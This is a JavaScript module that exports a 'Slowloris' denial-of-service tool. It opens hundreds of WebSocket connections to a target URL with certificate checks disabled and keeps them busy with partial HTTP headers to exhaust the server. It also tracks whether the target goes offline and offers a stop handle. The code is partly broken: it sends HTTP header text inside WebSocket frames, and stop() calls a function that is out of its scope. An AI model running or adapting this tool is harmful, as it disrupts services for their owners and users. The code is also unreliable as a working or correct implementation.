import { WebSocket } from 'ws';

function slowloris(target, numSockets, statsCallback) {
    if (!target) {
        console.error("Target URL is required.");
        return;
    }

    try {
        const parsedTarget = new URL(target);
        const hostname = parsedTarget.hostname;
        const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
        const isSecure = parsedTarget.protocol === 'https:';
        const path = parsedTarget.pathname || "/";

        if (!numSockets || numSockets <= 0) {
            numSockets = 200;
        }

        let sockets = [];
        let packetsSent = 0;
        let startTime = Date.now();
        let targetStatus = "Unknown";
        let mbps = 0;

        console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);

        for (let i = 0; i < numSockets; i++) {
            createSocket(hostname, port, i, isSecure, path);
        }

        function updateStats() {
            let elapsedTime = (Date.now() - startTime) / 1000;
            mbps = elapsedTime > 0 ? (packetsSent * 1000 / elapsedTime) / 1000000 : 0;

            if (statsCallback) {
                statsCallback({
                    mbps: mbps.toFixed(2),
                    packetsSent: packetsSent,
                    targetStatus: targetStatus,
                    elapsedTime: elapsedTime.toFixed(0)
                });
            }
        }

        setInterval(updateStats, 1000);

        function createSocket(hostname, port, index, isSecure, path) {
            let socket;
            try {
                const protocol = isSecure ? 'wss://' : 'ws://';
                socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
                    origin: `${protocol}${hostname}`,
                    rejectUnauthorized: false
                });

                sockets.push(socket);

                socket.on('open', () => {
                    console.log(`Socket ${index + 1} opened.`);
                    targetStatus = "Online";
                    sendInitialHeader(socket, hostname, path);
                    setInterval(() => {
                        sendKeepAliveHeader(socket);
                    }, 15000);
                });

                socket.on('close', () => {
                    console.log(`Socket ${index + 1} closed.`);
                    sockets = sockets.filter(s => s !== socket);
                    if (sockets.length === 0) {
                        targetStatus = "Offline";
                    }
                });

                socket.on('error', (error) => {
                    console.error(`Socket ${index + 1} error: ${error.message}`);
                    targetStatus = "Unresponsive";
                    closeSocket(socket, index);
                });

                socket.on('message', (data) => {
                });


            } catch (socketError) {
                console.error(`Error creating socket ${index + 1}:`, socketError.message);
            }
        }

        function sendInitialHeader(socket, hostname, path) {
            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n\r\n`;
            try {
                socket.send(initialHeader);
                packetsSent++;
            } catch (error) {
                console.error("Error sending initial header:", error.message);
                closeSocket(socket);
            }
        }

        function sendKeepAliveHeader(socket) {
            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
            try {
                socket.send(keepAliveHeader);
                packetsSent++;
            } catch (error) {
                console.error("Error sending keep-alive header:", error.message);
                closeSocket(socket);
            }
        }

        function closeSocket(socket, index) {
            try {
                if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
                    socket.close();
                }
                sockets = sockets.filter(s => s !== socket);
            } catch (closeError) {
                console.error(`Error closing socket ${index ? index + 1 : ''}:`, closeError.message);
            }
        }

    } catch (error) {
        console.error("Error during Slowloris setup:", error.message);
    }

    return {
        stop: () => {
            sockets.forEach(socket => {
                closeSocket(socket);
            });
            sockets = [];
            console.log("Slowloris attack stopped.");
        }
    };
}

export { slowloris };